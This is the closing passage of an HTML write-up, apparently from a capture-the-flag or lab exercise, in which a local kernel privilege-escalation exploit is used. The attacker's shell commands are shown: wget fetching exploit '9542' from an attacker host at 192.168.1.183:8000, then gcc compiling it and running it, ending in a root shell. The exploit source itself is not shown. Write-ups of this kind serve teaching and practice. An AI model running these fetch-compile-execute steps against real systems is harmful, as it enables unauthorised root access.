+                Serving&nbsp;HTTP&nbsp;on&nbsp;<span style="color:#ff0044;font-weight:400">0.0.0.0</span>&nbsp;port&nbsp;<span style="color:#ff0044;font-weight:400">8000</span>&nbsp;<span style="color:#ff9d00;font-weight:400">...</span>
+            </div>
+        </div><br>
+        <br>
+        And then on the victim machine downloaded the exploit, compiled it and ran it:<br>
+            <div class="codebox">
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>$&nbsp;wget&nbsp;http<span style="color:#ff9d00;font-weight:400">://</span><span style="color:#ff0044;font-weight:400">192.168.1.183</span><span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">8000</span><span style="color:#ff9d00;font-weight:400">/</span><span style="color:#ff0044;font-weight:400">9542</span><br>
+                <span style="color:#ff9d00;font-weight:400">--</span><span style="color:#ff0044;font-weight:400">05</span><span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">51</span><span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">55</span><span style="color:#ff9d00;font-weight:400">--</span>&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:400">://</span><span style="color:#ff0044;font-weight:400">192.168.1.183</span><span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">8000</span><span style="color:#ff9d00;font-weight:400">/</span><span style="color:#ff0044;font-weight:400">9542</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:400">=&gt;</span>&nbsp;`9542'<br>
+                Connecting&nbsp;to&nbsp;192.168.1.183:8000...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length:&nbsp;2,643&nbsp;(2.6K)&nbsp;[application/octet-stream]<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;0K&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;&nbsp;&nbsp;8.03&nbsp;MB/s<br>
+                <br>
+                05:51:55&nbsp;(8.03&nbsp;MB/s)&nbsp;-&nbsp;`<span style="color:#ff0044;font-weight:400">9542</span>'&nbsp;saved&nbsp;<span style="color:#ff9d00;font-weight:400">[</span><span style="color:#ff0044;font-weight:400">2643</span><span style="color:#ff9d00;font-weight:400">/</span><span style="color:#ff0044;font-weight:400">2643</span><span style="color:#ff9d00;font-weight:400">]</span><br>
+                <br>
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>$&nbsp;ls<br>
+                <span style="color:#ff0044;font-weight:400">9542</span><br>
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>$&nbsp;mv&nbsp;<span style="color:#ff0044;font-weight:400">9542</span>&nbsp;<span style="color:#ff0044;font-weight:400">9542</span><span style="color:#ff9d00;font-weight:400">.</span>c<br>
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>$&nbsp;gcc&nbsp;<span style="color:#ff0044;font-weight:400">9542</span><span style="color:#ff9d00;font-weight:400">.</span>c&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>o&nbsp;ring0<br>
+                <span style="color:#ff0044;font-weight:400">9542</span><span style="color:#ff9d00;font-weight:400">.</span>c<span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">109</span><span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">28</span><span style="color:#ff9d00;font-weight:400">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;no&nbsp;newline&nbsp;at&nbsp;end&nbsp;of&nbsp;file<br>
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>$&nbsp;ls<br>
+                <span style="color:#ff0044;font-weight:400">9542</span><span style="color:#ff9d00;font-weight:400">.</span>c<br>
+                ring0<br>
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>$&nbsp;<span style="color:#ff9d00;font-weight:400">./</span>ring0<br>
+                sh<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;no&nbsp;job&nbsp;control&nbsp;in&nbsp;<span style="color:#ff9d00;font-weight:700">this</span>&nbsp;shell<br>
+                sh<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>#&nbsp;id<br>
+                uid<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">(</span>root<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;gid<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">(</span>root<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;groups<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">48</span><span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">)</span><br>
+                sh<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3.00</span>#&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Success! A root shell :)<br>
+    </writeup>
+</section>
+
+</body>
+</html>
